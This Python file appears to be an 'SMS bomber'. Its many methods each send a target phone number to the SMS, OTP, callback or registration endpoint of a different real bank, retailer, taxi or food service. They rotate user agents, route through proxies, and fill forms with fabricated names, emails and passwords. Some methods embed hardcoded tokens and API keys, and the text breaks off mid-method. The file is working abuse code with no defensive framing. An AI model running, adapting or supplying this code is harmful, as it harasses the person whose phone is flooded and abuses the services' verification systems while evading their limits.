import json, requests
from bs4 import BeautifulSoup as bs
import random
from random import randint
from data import *


data_headers={"X-Requested-With": "XMLHttpRequest",
"Connection": "keep-alive",
"Pragma": "no-cache",
"Cache-Control": "no-cache",
"Accept-Encoding": "gzip, deflate, br",
'User-Agent':user_agent(), 'DNT':'1'}

def phone_mask(phone, maska):
    str_list = list(phone)
    for xxx in str_list:
        maska=maska.replace("#", xxx, 1)
    return maska

class Service():
    def __init__(self):
        self.start = True

    def number(self, number_phone):
        self.phone = number_phone
        if self.phone[0] == '+':
            self.phone_not_pluse = str(number_phone[1:])
            self.phone_mask = str(phone_mask(phone=self.phone_not_pluse, maska="+# (###) ###-##-##"))

            if self.phone[1] == '3':
                self.country_code = '380'

            elif self.phone[1] == '7':
                self.country_code = '7'

            elif self.phone[1] == '8':
                self.country_code = '7'

            elif self.phone[1] == '9':
                self.country_code = '998'

            else:
                self.country_code = str(self.phone[1])+str(self.phone[2])

        elif isinstance(int(self.phone), int):
            self.phone_not_pluse = str(number_phone)
            self.phone_mask = str(phone_mask(phone=number_phone, maska="+# (###) ###-##-##"))

            if self.phone[0] == '3':
                self.country_code = '380'

            elif self.phone[0] == '7':
                self.country_code = '7'

            elif self.phone[1] == '8':
                self.country_code = '7'

            elif self.phone[0] == '9':
                self.country_code = '998'

            else:
                self.country_code = str(self.phone[0])+str(self.phone[1])
            self.phone = '+'+str(number_phone)

    def benzuber(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://app.benzuber.ru/login", data={"phone":self.phone},headers=headers_copy, proxies=proxies)

    def cinema5(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://cinema5.ru/api/phone_code",
            data={"phone": self.phone}, headers=headers_copy, proxies=proxies)

    def citilink(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            f"https://www.citilink.ru/registration/confirm/phone/+{self.phone_not_pluse}/",headers=headers_copy, proxies=proxies)

    def city24(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://city24.ua/personalaccount/account/registration",
            data={"PhoneNumber": self.phone_not_pluse},headers=headers_copy, proxies=proxies)

    def studio(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        password = password()
        requests.post(
            "https://cross-studio.ru/ajax/lk/send_sms",
            data={
                "phone": self.phone_mask,
                "email": email(),
                "pass": password,
                "pass1": password,
                "name": username(),
                "fename": username(),
                "hash": "",
            },headers=headers_copy, proxies=proxies)

    def dianet(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://my.dianet.com.ua/send_sms/", data={"phone": self.phone}, headers=headers_copy, proxies=proxies)

    def dns_shop(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.dns-shop.ru/order/order-single-page/check-and-initiate-phone-confirmation/",
            params={"phone": self.phone, "is_repeat": 0, "order_guid": 1},headers=headers_copy, proxies=proxies)

    def eldorado(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://api.eldorado.ua/v1/sign/",
            params={
                "login": self.phone,
                "step": "phone-check",
                "fb_id": "null",
                "fb_token": "null",
                "lang": "ru"
            },headers=headers_copy, proxies=proxies)

    def finam(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.finam.ru/api/smslocker/sendcode",
            data={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def dgtl(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://i-dgtl.ru/curl/flashcall.php",
            data={
                "check": "",
                "flashcall-code": randint(1000, 9999),
                "flashcall-tel": self.phone,
            },headers=headers_copy, proxies=proxies)
        requests.post(
            "https://i-dgtl.ru/curl/sms.php",
            data={"check": "", "flashcall-tel": self.phone},headers=headers_copy, proxies=proxies)

    def flipkart(self,proxies):
        agent = user_agent()
        requests.post(
            "https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": agent,
            },
            data={"loginId": self.phone}
        )

        requests.post(
            "https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": agent,
            },
            json={"loginId": self.phone, "supportAllStates": True}, proxies=proxies)

    def foodband(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://foodband.ru/api?call=calls",
            data={
                "customerName": _ru_name_(),
                "phone": self.phone_mask,
                "g-recaptcha-response": "",
            },headers=headers_copy, proxies=proxies)

        requests.get(
            "https://foodband.ru/api/",
            params={
                "call": "customers/sendVerificationCode",
                "phone": self.phone,
                "g-recaptcha-response": "",
            },headers=headers_copy, proxies=proxies)

    def gazprom(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.gazprombank.ru/rest/sms.send",
            json={
                "phone": self.phone_mask,
                "type": "debit_card",
            },headers=headers_copy, proxies=proxies)

    def getmancar(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://crm.getmancar.com.ua/api/veryfyaccount",
            json={
                "phone": "+" + self.phone,
                "grant_type": "password",
                "client_id": "gcarAppMob",
                "client_secret": "SomeRandomCharsAndNumbersMobile",
            },headers=headers_copy, proxies=proxies)

    def ginzadelivery(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://ginzadelivery.ru/v1/auth", json={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def grinica(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://grilnica.ru/loginphone/",
            data={
                "step": 0,
                "phone": phone_mask(self.phone_not_pluse, "+# (###) ###-####"),
                "code": "",
                "allow_sms": "on",
                "apply_offer": "on",
            },headers=headers_copy, proxies=proxies)

    def gurutaxi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://guru.taxi/api/v1/driver/session/verify",
            json={"phone": {"code": 1, "number": self.phone}},headers=headers_copy, proxies=proxies)

    def hatimaki(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.hatimaki.ru/register/",
            data={
                "REGISTER[LOGIN]": self.phone,
                "REGISTER[PERSONAL_PHONE]": self.phone,
                "REGISTER[SMS_CODE]": "",
                "resend-sms": "1",
                "REGISTER[EMAIL]": "",
                "register_submit_button": "Зарегистрироваться",
            },headers=headers_copy, proxies=proxies)

    def helsi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://helsi.me/api/healthy/accounts/login",
            json={"phone": self.phone, "platform": "PISWeb"},headers=headers_copy, proxies=proxies)

    def hmara(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://api.hmara.tv/stable/entrance",
            params={"contact": self.phone},headers=headers_copy, proxies=proxies)

    def icq(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.icq.com/smsreg/requestPhoneValidation.php",
            data={
                "msisdn": self.phone,
                "locale": "en",
                "countryCode": "ru",
                "version": "1",
                "k": "ic1rtwz1s1Hj1O0r",
                "r": "46763",
            },headers=headers_copy, proxies=proxies)

    def ievaphone(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://ievaphone.com/call-my-phone/web/request-free-call",
            params={
                "phone": self.phone,
                "domain": "IEVAPHONE",
                "browser": "undefined",
            },headers=headers_copy, proxies=proxies)

    def imgur(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://api.imgur.com/account/v1/phones/verify",
            json={"phone_number": self.phone, "region_code": "RU"},headers=headers_copy, proxies=proxies)

    def indriver(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://terra-1.indriverapp.com/api/authorization?locale=ru",
            data={
                "mode": "request",
                "phone": self.phone,
                "phone_permission": "unknown",
                "stream_id": 0,
                "v": 3,
                "appversion": "3.20.6",
                "osversion": "unknown",
                "devicemodel": "unknown",
            },headers=headers_copy, proxies=proxies)

    def ingos(self,proxies):
        requests.post(
            "https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",
            headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal",'User-Agent':user_agent(), 'DNT':'1'},
            json={
                "Birthday": "1986-07-10T07:19:56.276+02:00",
                "DocIssueDate": "2004-02-05T07:19:56.276+02:00",
                "DocNumber": randint(500000, 999999),
                "DocSeries": randint(5000, 9999),
                "FirstName": _ru_name_(),
                "Gender": "M",
                "LastName": _ru_name_(),
                "SecondName": _ru_name_(),
                "Phone": self.phone,
                "Email": email(),
            }, proxies=proxies)

    def invitro(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
            data={
                "password": password(),
                "application": "lkp",
                "login": self.phone,
            },headers=headers_copy, proxies=proxies)

    def iqlab(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://iqlab.com.ua/session/ajaxregister",
            data={
                "cellphone": self.phone_mask,
            },headers=headers_copy, proxies=proxies)

    def ivi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://api.ivi.ru/mobileapi/user/register/phone/v6",
            data={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def iwant(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://i-want.ru/api/auth/v1/customer/login/phone",
            json={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def izi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://izi.ua/api/auth/register",
            json={
                "phone": "+" + self.phone,
                "name": _ru_name_(),
                "is_terms_accepted": True,
            },headers=headers_copy, proxies=proxies)

        requests.post(
            "https://izi.ua/api/auth/sms-login",
            json={"phone": "+" + self.phone},headers=headers_copy, proxies=proxies)

    def kant(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.kant.ru/ajax/profile/send_authcode.php",
            data={"Phone": self.phone},headers=headers_copy, proxies=proxies)

    def karusel(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        data = '{"phone":"urynuryn","recaptcha_token":"03AGdBq25jtGRIKs27kaAxrXny-d7exCD4pFyVMGs4uEWOY10JYgjlkbMqc4TRL8oK6z1DsvUxsC05cWZIRP97h29SZDvbQUDxv4Lm0E30QZ9Ykzhj5w5XKgzTP1ZRH6AcpCM2ygAPkfbwX58GdIuB2_UinPWT3aHDrv2EBgWe9bUKnTuE2SnM-qQmY2kG5bQ2LPm4kANF_N6e9cQ_kcX4hjECqtekk0sh82JvGH3Eoe0UJHzpKUj5czaqlDEQQTNHv5kaXj_yqygqTnSDDrcrOwWcK0Nm9aOcv5oooE6_bBBpiePD2WZZs1H-BqDTjITjv8d_C4F5cY1WdVKCEIY29teuMqDxFnwZs4C9mMJH4TIUgNqOVDM8PABs-rECsYIOkSF6naJ844Bbz9cTsi8VmLoPEXtPBABU58G5hErhzMg7eh2ZbgGOb2c"}'.replace('urynuryn', self.phone_not_pluse)
        requests.post(
            "https://app.karusel.ru/api/v1/token/", data=data,headers=headers_copy, proxies=proxies)

    def kaspi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://kaspi.kz/util/send-app-link", data={"address": self.phone},headers=headers_copy, proxies=proxies)

    def kfc(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
            json={"phone": self.phone}, headers=headers_copy, proxies=proxies)

    def kilovkusa(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://kilovkusa.ru/ajax.php",
            params={
                "block": "auth",
                "action": "send_register_sms_code",
                "data_type": "json",
            },
            data={"phone": f"{self.phone_mask}"},headers=headers_copy, proxies=proxies)

    def kinolab(self,proxies):
        requests.post(
            "https://api.kinoland.com.ua/api/v1/service/send-sms",
            headers={"Agent": "website"},
            json={"Phone": self.phone, "Type": 1}, proxies=proxies)

    def koronapay(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://koronapay.com/transfers/online/api/users/otps",
            data={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def krista(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://kristalnaya.ru/ajax/ajax.php?action=send_one_pas_reg",
            data={"phone":self.phone_mask}, headers=headers_copy, proxies=proxies)

    def kvivstart(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://cas-api.kyivstar.ua/api/sendSms",
            data={"lang": "uk", "msisdn": self.phone},headers=headers_copy, proxies=proxies)

    def lenta(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://lenta.com/api/v1/authentication/requestValidationCode",
            json={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def levin(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle",
            json={
                "url": "/api/client/phone_verification",
                "method": "POST",
                "data": {
                    "client_id": 5646981,
                    "phone": self.phone,
                    "alisa_id": 1,
                },
                "headers": {
                    "Client-Id": 5646981,
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            },headers=headers_copy, proxies=proxies)

    def limetaxi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "http://212.22.223.149:7200/api/account/register/sendConfirmCode",
            json={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def loany(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://loany.com.ua/funct/ajax/registration/code",
            data={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def logistic(self,proxies):
        requests.post(
            "https://api-rest.logistictech.ru/api/v1.1/clients/request-code",
            json={"phone": self.phone},
            headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9", 'User-Agent':user_agent()}, proxies=proxies)

    def makarolls(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",
            data={"data": self.phone, "metod": "postreg"},headers=headers_copy, proxies=proxies)

    def makimaki(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://makimaki.ru/system/callback.php",
            params={
                "cb_fio": _ru_name_(),
                "cb_phone": phone_mask(self.phone_not_pluse, "+# ### ### ## ##")
            },headers=headers_copy, proxies=proxies)

    def menuau(self,proxies):
        password = password()
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.menu.ua/kiev/delivery/registration/direct-registration.html",
            data={
                "user_info[fullname]": _ru_name_(),
                "user_info[phone]": self.phone,
                "user_info[email]": email(),
                "user_info[password]": password,
                "user_info[conf_password]": password,
            }, proxies=proxies)
        requests.post(
            "https://www.menu.ua/kiev/delivery/profile/show-verify.html",
            data={"phone": self.phone, "do": "phone"},headers=headers_copy, proxies=proxies)

    def menzacafe(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://menza-cafe.ru/system/call_me.php",
            params={
                "fio": _ru_name_(),
                "phone": self.phone,
                "phone_number": "1",
            }, proxies=proxies)

    def mistercash(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://my.mistercash.ua/ru/send/sms/registration",
            params={"number": self.phone},headers=headers_copy, proxies=proxies)

    def mngogomenu(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(f"http://mnogomenu.ru/office/password/reset/{self.phone_mask}",headers=headers_copy, proxies=proxies)
        requests.post('http://mnogomenu.ru/ajax/callback/send', data={f'uname':{name()},'uphone':f'{phone_mask(phone=self.phone_not_pluse, maska="+#(###)+###+##+##")}'},
        headers=headers_copy, proxies=proxies)

    def mobileplanet(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://mobileplanet.ua/register",
            data={
                "klient_name": username(),
                "klient_phone": self.phone,
                "klient_email": email(),
            },headers=headers_copy, proxies=proxies)

    def modulbank(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://my.modulbank.ru/api/v2/registration/nameAndPhone",
            json={
                "FirstName": _ru_name_(),
                "CellPhone": self.phone,
                "Package": "optimal",
            },headers=headers_copy, proxies=proxies)

    def molbulak(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.molbulak.ru/ajax/smsservice.php",
            data={"command": "send_code_loan", "phone": self.phone},headers=headers_copy, proxies=proxies)

    def moneymanu(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://moneyman.ru/registration_api/actions/send-confirmation-code",
            data=self.phone,headers=headers_copy, proxies=proxies)

    def monobank(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.monobank.com.ua/api/mobapplink/send",
            data={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def mospizza(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",
            data={"name": _ru_name_(), "phone": self.phone}, headers=headers_copy, proxies=proxies)

    def moyo(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.moyo.ua/identity/registration",
            data={
                "firstname": name(),
                "phone": self.phone,
                "email": email()
            },headers=headers_copy, proxies=proxies)

    def mtstv(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
            params={"msisdn": self.phone},headers=headers_copy, proxies=proxies)

    def multiplex(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://auth.multiplex.ua/login", json={"login": self.phone},headers=headers_copy, proxies=proxies)

    def mygames(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://account.my.games/signup_send_sms/",
            data={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def niyama(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.niyama.ru/ajax/sendSMS.php",
            data={
                "REGISTER[PERSONAL_PHONE]": self.phone,
                "code": "",
                "sendsms": "Выслать код",
            }, proxies=proxies)

    def nl(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.nl.ua",
            data={
                "component": "bxmaker.authuserphone.login",
                "sessid": "bf70db951f54b837748f69b75a61deb4",
                "method": "sendCode",
                "phone": self.phone,
                "registration": "N",
            },headers=headers_copy, proxies=proxies)

    def nncard(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://nn-card.ru/api/1.0/register",
            json={"phone": self.phone, "password": password()},headers=headers_copy, proxies=proxies)

    def nova(self,proxies):
        name = "".join(random.choices("Іїє", k=random.randint(3, 5)))
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://api.novaposhta.ua/v2.0/json/LoyaltyUserGeneral/registration",
            json={
                "modelName": "LoyaltyUserGeneral",
                "calledMethod": "registration",
                "system": "PA 3.0",
                "methodProperties": {
                    "City": "8d5a980d-391c-11dd-90d9-001a92567626",
                    "FirstName": name,
                    "LastName": name,
                    "Patronymic": name,
                    "Phone": f"{self.phone}",
                    "Email": email(),
                    "BirthDate": "06.06.2010",
                    "Password": "0c465655c53d2d8ec971581f5dfdbd83",
                    "Gender": "M",
                    "CounterpartyType": "PrivatePerson",
                    "MarketplacePartnerToken": "005056887b8d-b5da-11e6-9f54-cea38574",
                },
            },headers=headers_copy, proxies=proxies)

    def ok(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
            data={"st.r.phone": self.phone},headers=headers_copy, proxies=proxies)

    def okean(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://okeansushi.ru/includes/contact.php",
            params={
                "call_mail": "1",
                "ajax": "1",
                "name": _ru_name_(),
                "phone": self.phone,
                "call_time": "1",
                "pravila2": "on",
            },headers=headers_copy, proxies=proxies)

    def oldi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.oldi.ru/ajax/reg.php",
            data={
                "method": "isUserPhone",
                "phone": self.phone_mask,
            },headers=headers_copy, proxies=proxies)

    def ollis(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.ollis.ru/gql",
            json={
                "query": 'mutation { phone(number:'+self.phone+', locale:ru) { token error { code message } } }'
            },headers=headers_copy, proxies=proxies)

    def onlineua(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://secure.online.ua/ajax/check_phone/",
            params={"reg_phone": self.phone},headers=headers_copy, proxies=proxies)

    def osaka(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.osaka161.ru/local/tools/webstroy.webservice.php",
            data={
                "name": "Auth.SendPassword",
                "params[0]": self.phone_mask,
            },headers=headers_copy, proxies=proxies)

    def ozon(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
            json={"phone": self.phone, "otpId": 0},headers=headers_copy, proxies=proxies)

    def panpizza(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",
            data={"telephone": "8" + self.phone_not_pluse[1:]},headers=headers_copy, proxies=proxies)

    def pirogin(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://piroginomerodin.ru/index.php?route=sms/login/sendreg",
            data={"telephone": "+" + self.phone_not_pluse}, headers=headers_copy, proxies=proxies)

    def pizza46(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://pizza46.ru/ajaxGet.php",
            data={"phone": phone_mask(self.phone_not_pluse, "+# (###) ###-####")}, headers=headers_copy, proxies=proxies)

    def pizzakaz(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://pizzakazan.com/auth/ajax.php",
            data={"phone": "+" + self.phone_not_pluse, "method": "sendCode"},headers=headers_copy, proxies=proxies)

    def pizzasinizza(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://pizzasinizza.ru/api/phoneCode.php", json={"phone": self.phone},headers=headers_copy, proxies=proxies)
        

    def planetak(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://cabinet.planetakino.ua/service/sms",
            params={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def pliskov(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
            data={"phone": self.phone_mask},headers=headers_copy, proxies=proxies)

    def pomodoro(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://butovo.pizzapomodoro.ru/ajax/user/auth.php",
            data={
                "AUTH_ACTION": "SEND_USER_CODE",
                "phone": self.phone_mask,
            },headers=headers_copy, proxies=proxies)

    def privatebank(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://carddesign.privatbank.ua/phone",
            data={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def prosushi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.prosushi.ru/php/profile.php",
            data={"phone": self.phone, "mode": "sms"},headers=headers_copy, proxies=proxies)
        

    def qbbox(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://qbbox.ru/api/user",
            json={"phone": self.phone, "account_type": 1},headers=headers_copy, proxies=proxies)

    def qlean(self,proxies):
        requests.post(
            "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
            json={"phone": self.phone}, proxies=proxies)

        requests.get(
            "https://sso.cloud.qlean.ru/http/users/requestotp",
            headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
            params={
                "phone": self.phone,
                "clientId": "undefined",
                "sessionId": str(randint(5000, 9999)),
            }, proxies=proxies)

    def raiffeisen(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
            params={"number": self.phone},headers=headers_copy, proxies=proxies)

    def rbt(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.rbt.ru/user/sendCode/",
            data={"phone": self.phone_mask}, headers=headers_copy, proxies=proxies)

    def rendesvouz(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://www.rendez-vous.ru/callback/create/",
            data={'input_for_spam':'Callback','name':name(),
            'phone':phone_mask(self.phone_not_pluse, "+#(###)###-##-##"),
            'ajax':'callback-form', 'yt2':'Отправить заявку'
            },headers=headers_copy, proxies=proxies)

    def sushiroll(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://sushirolla.ru/page/save.php",
            data={
                "send_me_password": 1,
                "phone": self.phone_mask,
            },headers=headers_copy, proxies=proxies)

    def richfamely(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post("https://region.richfamily.ru/ajax/sms_activities/sms_validate_phone.php",
            data={'phone':phone_mask(self.phone_not_pluse, '#-###-###-##-##'),
            'isAuth':'Y', 'sessid':'e3v9bp9aw4be3caeb4rd5ma2ea73e7d3'}, headers=headers_copy, proxies=proxies)

    def rieltor(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://rieltor.ua/api/users/register-sms/",
            json={"phone": self.phone, "retry": 0},headers=headers_copy, proxies=proxies)

    def rutaxi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://rutaxi.ru/ajax_auth.html", data={"l": self.phone, "c": "3"},headers=headers_copy, proxies=proxies)

    def rutube(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://pass.rutube.ru/api/accounts/phone/send-password/",
            json={"phone": self.phone}, headers=headers_copy, proxies=proxies)

    def sayoris(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://sayoris.ru/?route=parse/whats",
            data={"phone": self.phone},headers=headers_copy, proxies=proxies)

    def sedi(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.get(
            "https://msk1.sedi.ru/webapi",
            params={
                "callback": "jQuery19107992940218113256_1595059640271",
                "q": "get_activation_key",
                "phone": self.phone_mask,
                "way": "bysms",
                "usertype": "customer",
                "lang": "ru-RU",
                "apikey": "EF96ADBE-2DFC-48F7-AF0A-69A007223039",
            },headers=headers_copy, proxies=proxies)

    def shafa(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://shafa.ua/api/v3/graphiql",
            json={
                "operationName": "RegistrationSendSms",
                "variables": {"phoneNumber": self.phone},
                "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
            },headers=headers_copy, proxies=proxies)

        requests.post(
            "https://shafa.ua/api/v3/graphiql",
            json={
                "operationName": "sendResetPasswordSms",
                "variables": {"phoneNumber": self.phone},
                "query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n",
            },headers=headers_copy, proxies=proxies)

    def shopandshow(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
        requests.post(
            "https://shopandshow.ru/sms/password-request/",
            data={"phone": self.phone, "resend": 0},headers=headers_copy, proxies=proxies)

    def signalis(self,proxies):
        headers_copy = data_headers; headers_copy['User-Agent'] = user_agent()
